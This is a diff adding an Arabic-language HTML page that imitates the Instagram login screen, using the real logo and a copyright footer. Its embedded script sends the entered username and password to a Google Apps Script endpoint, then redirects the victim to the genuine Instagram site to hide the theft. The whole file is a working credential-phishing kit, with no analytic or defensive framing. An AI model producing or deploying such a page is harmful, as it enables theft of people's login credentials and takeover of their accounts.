@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تسجيل الدخول - انستجرام</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  body {
+    background-color: #fafafa;
+    font-family: 'Roboto', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 40px 40px 30px;
+    width: 350px;
+    box-sizing: border-box;
+    text-align: center;
+    border-radius: 1px;
+  }
+  .logo {
+    background-image: url('https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: 175px 51px;
+    height: 51px;
+    margin-bottom: 20px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    margin: 6px 0 12px;
+    padding: 9px 8px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+    font-size: 14px;
+    box-sizing: border-box;
+    outline: none;
+    transition: border-color 0.3s ease;
+  }
+  input[type="text"]:focus,
+  input[type="password"]:focus {
+    border-color: #a8a8a8;
+  }
+  button {
+    width: 100%;
+    background-color: #0095f6;
+    border: none;
+    padding: 8px 0;
+    color: white;
+    font-weight: bold;
+    font-size: 14px;
+    border-radius: 3px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #007ac1;
+  }
+  .footer-text {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #999;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo"></div>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required />
+      <input type="password" id="password" placeholder="كلمة المرور" required />
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+    <div class="footer-text">© 2025 Instagram</div>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxnHCf7PwyIfrmd06EkqcyZjC_KfWA6ss58HQvHOWbB_gWC4YbPMluRGRMZv5C7GkahqQ/exec';
+
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      const data = {
+        username: form.username.value,
+        password: form.password.value
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(() => {
+        // بعد ما ترسل البيانات، يوديك لصفحة انستجرام الأصلية
+        window.location.href = 'https://www.instagram.com/';
+      })
+      .catch(err => console.error('حدث خطأ!', err.message));
+    });
+  </script>
+</body>
+</html>
+
